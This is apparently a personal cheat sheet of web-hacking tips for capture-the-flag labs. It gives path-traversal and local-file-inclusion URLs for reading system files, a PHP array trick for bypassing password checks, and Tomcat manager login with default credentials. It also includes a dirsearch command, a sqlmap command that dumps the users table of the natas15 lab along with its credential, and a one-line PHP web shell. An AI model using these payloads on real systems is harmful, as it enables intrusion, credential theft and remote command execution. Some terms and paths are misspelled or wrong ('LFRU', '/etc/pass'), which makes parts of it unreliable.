# Tips and Tricks for Web


## PHP []
When Submit was pressed, a POST request was sent to the server containing:  
```
password=yourinput
```
We break the application by passing an array as the password.  
```
password[]=
```

### Web Upload

If we have a LFRU (Local File Remote Upload) we use:
`http://website.com:port/files/../../../../etc/pass`.
If that doesnt work we then use
`http://website.com:port/files/..%2F..%2F..%2F..%2Fetc%2Fpass`
for LFI.

If `etc/pass` is useless we use then `/proc/self/environ` by `http://website.com:port/files/..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron`
Add more %2F inbetween if needed.

## Tomcat Manager
Apache Tomcat has a `manager`, so inorder to access him we place this at the end of the url `/manager/html`.  
If luck still isnt on our side, we add tomcat default credentials too at the begining of the url, such as: `http://tomcat:tomcat@host:proxy/manager/html`

### Tools

## dirsearch

python3 dirsearch.py -u host --proxy=http://host:port/ -e sh,txt,php,html,htm,asp,aspx,js,xml,log,json,jpg,jpeg,png,gif,doc,pdf,mpg,mp3,zip,tar.gz,tar

## SQL Map
./sqlmap.py --auth-type=basic --auth-cred=natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J -u http://natas15.natas.labs.overthewire.org/index.php --data="username=a" -p username --string=doesn --level=5 --user-agent=Mozilla --dbms=MySQL --threads 4 -D natas15 -T users --dump

## Image Valun
<?php system($_GET['cmd']); die(); ?>
